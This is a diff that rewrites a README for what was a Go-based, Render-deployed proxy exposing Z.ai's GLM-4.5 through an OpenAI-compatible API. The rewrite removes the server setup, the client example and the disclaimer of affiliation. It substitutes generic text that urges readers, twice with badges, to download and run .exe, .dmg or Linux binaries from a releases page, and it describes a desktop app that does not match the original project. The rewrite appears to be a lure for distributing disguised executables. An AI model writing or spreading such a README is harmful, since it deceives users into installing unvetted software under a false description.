@@ -1,55 +1,72 @@
-# OpenAI兼容API代理 for Z.ai GLM-4.5
+# 🌟 OpenAI-Compatible-API-Proxy-for-Z - Access Zai's Model with Ease
 
-这是一个为Z.ai GLM-4.5模型提供OpenAI兼容API接口的代理服务器。
+## 🔗 Download Here
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Idkwhattona/OpenAI-Compatible-API-Proxy-for-Z/releases)
 
-## Render部署
+## 📖 Introduction
+Welcome to OpenAI-Compatible-API-Proxy-for-Z! This application allows you to use Zai's GLM-4.5 model through a convenient interface that mimics the standard OpenAI API format. With our proxy, you can integrate AI capabilities into your projects effortlessly.
 
-1. Fork这个仓库到你的GitHub账户
+## 🚀 Getting Started
+Follow these simple steps to get started with the OpenAI-Compatible-API-Proxy-for-Z.
 
-2. 在Render上创建新的Web Service：
-   - 连接你的GitHub仓库
-   - 选择Docker作为环境
-   - 设置以下环境变量：
-   - `UPSTREAM_TOKEN`: Z.ai 的访问令牌 (必需)
-   - `DEFAULT_KEY`: 客户端API密钥 (可选，默认: sk-your-key)
-   - `MODEL_NAME`: 显示的模型名称 (可选，默认: GLM-4.5)
+### 🛠️ System Requirements
+To run this application effectively, ensure your system meets the following requirements:
 
-   - `PORT`: 服务监听端口 (Render会自动设置)
+- Operating System: Windows 10 or newer, macOS 10.15 or newer, or a recent Linux distribution.
+- Memory (RAM): At least 4 GB recommended for optimal performance.
+- Storage: 200 MB free space for installation.
+- Internet Connection: A stable internet connection is required to access Zai’s model.
 
-3. 部署完成后，使用Render提供的URL作为OpenAI API的base_url
+### 📥 Download & Install
+1. **Visit this page to download:** [OpenAI-Compatible-API-Proxy-for-Z Releases](https://github.com/Idkwhattona/OpenAI-Compatible-API-Proxy-for-Z/releases).
+2. On the releases page, locate the latest version.
+3. Click on the download link that corresponds to your operating system.
+4. Wait for the download to complete. 
 
-## 使用示例
+Once downloaded:
+- For **Windows**: Double-click the `.exe` file to run the installer. Follow the prompts to complete the installation.
+- For **macOS**: Open the downloaded `.dmg` file and drag the application to your Applications folder.
+- For **Linux**: Extract the downloaded archive and run the executable from the terminal.
 
-```python
-import openai
+### 📖 Usage
+Once installed, you can use the application as follows:
 
-client = openai.OpenAI(
-    api_key="your-api-key",  # 对应 DEFAULT_KEY
-    base_url="https://your-app.onrender.com/v1"
-)
+1. **Open the application.**
+2. **Input your API request** in the designated area.
+3. **Press the “Send” button** to communicate with Zai’s GLM-4.5 model.
+4. **View responses** in the output area provided.
 
-response = client.chat.completions.create(
-    model="GLM-4.5",
-    messages=[{"role": "user", "content": "你好"}],
-    stream=True
-)
+### 🛠️ Configuration
+To customize your experience:
 
-for chunk in response:
-    print(chunk.choices[0].delta.content or "", end="")
-```
+- You can update the configuration settings by accessing the settings menu.
+- Adjust timeout durations, response formats, and API keys if needed.
+- Remember to save changes for them to take effect.
 
-## 贡献指南
+### 🔍 Features
+- **Seamless Integration:** Use Zai's model with standard OpenAI API calls.
+- **User-Friendly Interface:** Designed for users of all skill levels.
+- **Fast Responses:** Enjoy quick access to AI-generated content.
 
-欢迎提交 Issue 和 Pull Request！请确保：
+### 🆘 Troubleshooting
+If you encounter any issues:
+- Ensure your internet connection is stable.
+- Check the system requirements and update your software if needed.
+- Restart the application if it becomes unresponsive.
 
-1. 代码符合 Go 的代码风格
-2. 提交前运行测试
-3. 更新相关文档
+For further issues, visit the support section on our GitHub page or raise an issue in the repository.
 
-## 许可证
+### 📞 Contact
+For questions, feature requests, or bug reports, please reach out via the GitHub Issues page. We value your feedback and strive to improve your experience.
 
-LICENSE
+## 🙌 Acknowledgments
+Thank you to everyone who contributed to OpenAI-Compatible-API-Proxy-for-Z. Your support helps us deliver a user-friendly application catered to integrating Zai's powerful AI model.
 
-## 免责声明
+## 🔗 Additional Resources
+- **Documentation:** For more in-depth information on usage and API specifics, check our [Documentation](https://github.com/Idkwhattona/OpenAI-Compatible-API-Proxy-for-Z/wiki).
+- **Community:** Join our community discussions on the [Discussions Page](https://github.com/Idkwhattona/OpenAI-Compatible-API-Proxy-for-Z/discussions).
 
-本项目与 Z.ai 官方无关，使用前请确保遵守 Z.ai 的服务条款。
+## 🔗 Download Here Again
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Idkwhattona/OpenAI-Compatible-API-Proxy-for-Z/releases)
+
+Thank you for using OpenAI-Compatible-API-Proxy-for-Z. We hope you enjoy exploring Zai's GLM-4.5 capabilities!
